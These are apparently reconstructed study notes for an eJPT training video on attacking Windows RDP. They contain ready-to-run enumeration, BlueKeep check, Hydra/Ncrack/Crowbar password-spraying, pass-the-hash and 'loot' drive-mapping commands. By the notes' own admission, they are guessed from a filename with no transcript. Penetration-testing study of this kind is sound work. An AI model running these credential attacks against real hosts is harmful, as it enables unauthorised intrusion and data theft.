# Exploiting RDP (Remote Desktop Protocol)

Note: No transcript was provided. The following is a conservative, best-effort summary based on the filename “12 - Exploiting RDP.mp4” within “02-ExploitingWindowsVulnerabilities” and common eJPT methodology.

## What the video covers (Introduction / big picture)
- How to identify and enumerate RDP (TCP/3389) on Windows targets.
- How to assess RDP security posture (NLA, encryption, domain/workgroup info).
- How to check for well-known RDP vulnerabilities (older MS12-020; BlueKeep CVE-2019-0708) safely.
- How to perform credential attacks against RDP (password spraying/bruteforce) with appropriate caution.
- How to connect once valid credentials are found (xfreerdp basics).
- Practical considerations to avoid account lockouts and service crashes.

## Flow (ordered)
1. Discover RDP and fingerprint the service.
2. Enumerate RDP settings and host/domain info (NSE scripts).
3. Optionally check for known RDP vulns (carefully).
4. Build a focused user/password strategy (names from enumeration, org clues).
5. Attempt credential attacks with rate/lockout controls.
6. Validate credentials by logging into RDP.
7. Transfer files or operate interactively via RDP session.

## Tools highlighted
- Nmap (scripts: rdp-enum-encryption, rdp-ntlm-info, rdp-vuln-ms12-020)
- Metasploit (auxiliary/scanner/rdp/*, rdp_login; BlueKeep check modules)
- Hydra or Ncrack (credential attacks against RDP)
- Crowbar (RDP password spray)
- xfreerdp (primary Linux RDP client; supports domain, clipboard, drive mapping)
- rdesktop (fallback RDP client; older)

## Typical command walkthrough (detailed, copy-paste friendly)

Create a working folder
```bash
mkdir -p ~/engagement/scans ~/engagement/wordlists
cd ~/engagement
```

1) Scan for RDP and fingerprint
```bash
# Quick check on a single host
nmap -p 3389 -sC -sV -oN scans/rdp_basic.txt <IP>

# Sweep a subnet for RDP
nmap -p 3389 --open -oG scans/rdp_grepable.txt <CIDR>

# Enumerate RDP details
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 -oN scans/rdp_nse.txt <IP>
```
- rdp-enum-encryption: Checks protocol security (SSL/TLS/Standard RDP) and NLA support.
- rdp-ntlm-info: Extracts domain/workgroup and OS build via NTLM.
- rdp-vuln-ms12-020: Tests for an older, serious RDP vuln (can be risky on fragile systems—use with caution).

2) (Optional) Metasploit enumeration and vuln checks
```bash
msfconsole -q
```
Inside msfconsole:
```text
# Basic RDP scanner (detects service and some properties)
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <IP>
run

# Check for BlueKeep (module names can vary; search first)
search bluekeep
# Example:
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP>
run
```
Note: Many BlueKeep exploits are unstable and require very specific target conditions. Use check modules rather than exploitation in typical eJPT labs.

3) Build credential lists (example)
```bash
# Based on org info and rdp-ntlm-info output (domain/workgroup)
cat > users.txt << 'EOF'
Administrator
admin
user
svc_account
EOF

# Use a focused password list for spray first
cat > passwords.txt << 'EOF'
Spring2024!
Password1
Welcome1
Admin@123
P@ssw0rd
EOF
```

4) Credential attacks (use caution to avoid lockouts)

Hydra (stop on first hit, verbose, modest concurrency)
```bash
hydra -L users.txt -P passwords.txt -f -V -t 4 rdp://<IP>
# Single user spray
hydra -l Administrator -P passwords.txt -f -V -t 4 rdp://<IP>
```

Ncrack (good RDP support; can limit concurrency)
```bash
ncrack -vv --user Administrator -P passwords.txt --connection-limit 1 rdp://<IP>:3389

# Multiple users
ncrack -vv -U users.txt -P passwords.txt --connection-limit 1 rdp://<IP>:3389
```

Crowbar (simple spray, single user)
```bash
crowbar -b rdp -s <IP>/32 -u Administrator -C passwords.txt
```

Metasploit rdp_login
```text
use auxiliary/scanner/rdp/rdp_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
set BRUTEFORCE_SPEED 5
run
```

Tips for formats:
- If a domain is present, try usernames as DOMAIN\user and user@domain.local in tools that support it.
- Keep thread counts low (-t 1..4) and consider time gaps to avoid lockouts.

5) Connect with xfreerdp once you have valid creds
```bash
# Local account or standalone
xfreerdp /v:<IP> /u:<User> /p:'<Password>' /cert:ignore +clipboard /dynamic-resolution /drive:loot,/tmp

# Domain account
xfreerdp /v:<IP> /u:<User> /p:'<Password>' /d:<DOMAIN> /cert:ignore +clipboard /dynamic-resolution /drive:loot,/tmp
```

Optional xfreerdp notes:
- /cert:ignore: ignore self-signed TLS certs.
- +clipboard: enables clipboard sharing.
- /drive:loot,/tmp: maps /tmp as a drive “loot” in the RDP session for easy file transfer.
- Pass-the-hash may work on some FreeRDP builds:
```bash
# Only if your xfreerdp supports NTLM hash auth and target accepts it
xfreerdp /v:<IP> /u:<User> /pth:<NTLM_HASH> /cert:ignore
```

6) Alternative RDP client (fallback)
```bash
rdesktop -u <User> -p '<Password>' -g 1366x768 -r clipboard:PRIMARYCLIPBOARD -r disk:loot=/tmp <IP>
```

## Practical tips
- Prefer targeted password spraying before full bruteforce. Start with a handful of high-probability passwords.
- Mind account lockouts. Use low thread counts, insert delays, and stop on success.
- Use rdp-ntlm-info to grab domain/workgroup and OS info; tailor usernames accordingly.
- NLA enabled typically mitigates older pre-auth RDP exploits (e.g., BlueKeep). Expect credential-based paths to be the practical route in labs.
- Many vuln checks can be disruptive. Read the NSE script docs and Metasploit module notes; avoid unsafe checks on fragile systems.
- If RDP is reachable only internally, consider pivoting/port-forwarding (beyond scope here) instead of scanning from outside.
- After login, you can map a drive and use the clipboard for quick loot exfiltration.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover and enumerate
nmap -p 3389 -sC -sV -oN rdp_basic.txt <IP>
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 -oN rdp_nse.txt <IP>

# 2) (Optional) Metasploit checks
msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS <IP>; run; exit"

# 3) Prepare creds
echo -e "Administrator\nadmin\nuser" > users.txt
echo -e "Password1\nWelcome1\nP@ssw0rd" > passwords.txt

# 4) Try creds cautiously
hydra -L users.txt -P passwords.txt -f -V -t 3 rdp://<IP>
# or:
ncrack -vv -U users.txt -P passwords.txt --connection-limit 1 rdp://<IP>:3389

# 5) Connect if creds found
xfreerdp /v:<IP> /u:<User> /p:'<Password>' /cert:ignore +clipboard /dynamic-resolution /drive:loot,/tmp
```

## Summary
- RDP (3389/TCP) is a high-value Windows entry point in many eJPT scenarios.
- Enumerate first: nmap with rdp-enum-encryption and rdp-ntlm-info to learn NLA, domain, and OS hints.
- Treat pre-auth RDP vulns (MS12-020, BlueKeep) carefully; in modern/lab setups, credential attacks are the practical path.
- Use Hydra/Ncrack/Crowbar or Metasploit rdp_login with conservative rates to avoid lockouts.
- Connect with xfreerdp and leverage clipboard/drive mapping for efficient post-access workflow.